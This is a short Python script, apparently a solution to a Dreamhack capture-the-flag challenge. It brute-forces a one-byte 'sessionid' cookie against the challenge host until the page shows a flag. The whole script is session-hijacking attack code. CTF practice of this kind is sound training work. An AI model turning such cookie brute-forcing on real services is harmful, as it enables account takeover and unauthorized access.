import requests

url = ("http://host1.dreamhack.games:15937/")

for i in range(0, 0xFF + 1):
    cookies = {"sessionid": hex(i)[2:].zfill(2)}
    res = requests.get(url, cookies=cookies)
    if "DH" in res.text:
        print(res.text)
        print(hex(i)[2:].zfill(2))
        break
